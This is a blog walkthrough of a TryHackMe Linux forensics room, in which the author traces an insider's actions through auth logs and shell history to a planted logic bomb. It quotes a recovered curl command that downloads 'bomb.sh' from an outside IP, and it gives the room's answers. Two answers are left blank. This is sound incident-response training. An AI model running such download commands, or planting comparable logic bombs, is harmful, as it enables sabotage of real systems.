---
date: 2025-07-16 16:15:06
layout: post
title: TryHackMe - Disgruntled - Write-Up
subtitle: Use your Linux forensics knowledge to investigate an incident.
description: A walkthrough of the TryHackMe room Disgruntled
image: https://tryhackme-images.s3.amazonaws.com/room-icons/03de138b8dfa8f5b003298c17b73fbd8.png
category: write-up
tags:
  - disgruntled
  - tryhackme
  - write-up
  - walkthrough
  - linux
  - incident-response
  - infosec
  - cybersecurity
  - soc-analyst
author: Michael
paginate: false
---
The TryHackMe room Disgruntled can be found [here](https://tryhackme.com/room/disgruntled).

> Hey, kid! Good, you’re here!
>
> Not sure if you’ve seen the news, but an employee from the IT department of one of our clients (CyberT) got arrested by the police. The guy was running a successful phishing operation as a side gig.
>
> CyberT wants us to check if this person has done anything malicious to any of their assets. Get set up, grab a cup of coffee, and meet me in the conference room.

This room will test our ability to navigate through the Linux command line to find evidence of potential system abuse.  We're given only a terminal as our machine:

![](/assets/img/uploads/beginning-terminal.png)

Task 1 was the above introduction.  Let's move on to Task 2!

## Task 2 - Linux Forensics review

![](/assets/img/uploads/linux-forensics-cheatsheet.png)

This task only provides a Linux "cheat sheet" -- very helpful for the upcoming tasks, but doesn't require anything from us.

## Task 3 - Nothing suspicious... So far

> Here’s the machine our disgruntled IT user last worked on. Check if there’s anything our client needs to be worried about.
>
> My advice: Look at the privileged commands that were run. That should get you started.

### The user installed a package on the machine using elevated privileges. According to the logs, what is the full COMMAND?

We're looking for actions committed with elevated privileges, and in a Linux system, this means looking for uses of the `sudo` command.

Let's start by seeing checking the `sudoers` list to see who has `sudo` permissions:

![](/assets/img/uploads/sudoers-list.png)

The account `cybert` (the name of our the company the former employee worked for) has sudo rights, so let's check for any installations this account may have run.

We can do this by running `grep cybert /var/log/auth.log* | grep install`.  This command checks the authentication logs (`/var/log/auth.log*`) for all references of "cybert" (`grep cybert`), and then takes the results of that command and checks for all references of "install" (`grep install`).

The twice-filtered result directs us to our answer:

![](/assets/img/uploads/apt-install-dokuwiki.png)

**Answer**: `/usr/bin/apt install dokuwiki`

### What was the present working directory (PWD) when the previous command was run?

The above command also gives us the answer to this question:

![](/assets/img/uploads/home-cybert.png)

**Answer**: `/home/cybert`

## Task 4 - Let’s see if you did anything bad

> Keep going. Our disgruntled IT was supposed to only install a service on this computer, so look for commands that are unrelated to that.

### Which user was created after the package from the previous task was installed?

To find this answer, we'll search the logs in the same way: `grep cybert /var/log/auth.log* | grep adduser`. This time we're searching for instances of the `adduser` command run by cybert.

![](/assets/img/uploads/it-admin.png)

**Answer**: it-admin

### A user was then later given sudo priveleges. When was the sudoers file updated? (Format: Month Day HH:MM:SS)

We can find evidence of the sudoers file being edited by looking for evidence of the `visudo` command: `grep cybert /var/log/auth.log* | grep visudo`.  Looking at the results, we find one instance of cybert running the command, and pull the date from that.

![](/assets/img/uploads/visudo.png)

**Answer**: Dec 28 06:27:34

### A script file was opened using the "vi" text editor. What is the name of this file?

We can find this by looking through the `.bash_history` file of a user.  It *could* be in cybert's home folder, but dollars to donuts we will find evidence of the file in the newly created it-admin's history.  Why else might the account have been created?

And sure enough, look what we find:

![](/assets/img/uploads/vi-bomb.sh.png)

A suspiciously named file, no?

**Answer**: `bomb.sh`

## Task 5 - Bomb has been planted. But when and where?

> That `bomb.sh` file is a huge red flag! While a file is already incriminating in itself, we still need to find out where it came from and what it contains. The problem is that the file does not exist anymore.

### What is the command used that created the file `bomb.sh`?

The answer to this question is found in the line above the answer to the previous question:

![](/assets/img/uploads/curl-bomb.sh.png)

**Answer**: `curl 10.10.158.38:8080/bomb.sh --output bomb.sh`

### The file was renamed and moved to a different directory. What is the full path of this file now?

We know that `vi` was used to edit the `bomb.sh` file, so we can take a look at it-admin's `.vimhistory` to see what edits were made.

![](/assets/img/uploads/viminfo-bin-os-update.png)

Sure enough, first thing we see is a rename of the file.

**Answer**: `/bin/os-update.sh`

### When was the file from the previous question last modified? (Format: Month Day HH:MM)

We can find this answer with the command `ls -la --full-time /bin/os-update.sh`, and then format it as requested.

![](/assets/img/uploads/full-time.png)

 **Answer**: Dec 28 06:29

### What is the name of the file that will get created when the file from the first question executes?

Let's take a look at the `os-update.sh` file's contents.  It's not a terribly long program, so we can just `cat` it to the terminal.



**Answer**:

### Task 6 - Following the fuse

> So we have a file and a motive. The question we now have is: how will this file be executed?
>
> Surely, he wants it to execute at some point?

### At what time will the malicious file trigger? (Format: HH:MM AM/PM)

**Answer**:

## Task 7 - Conclusion

> Thanks to you, we now have a good idea of what our disgruntled IT person was planning.
>
> We know that he had downloaded a previously prepared script into the machine, which will delete all the files of the installed service if the user has not logged in to this machine in the last 30 days. It’s a textbook example of a  “logic bomb”, that’s for sure.
>
> Look at you, second day on the job, and you’ve already solved 2 cases for me. Tell Sophie I told you to give you a raise.

## EOF

I really like these rooms which fully commit to a story!  It helps to feel more like a real event.

![](/assets/img/uploads/badge-disgruntled.png)

Tools used: Linux CLI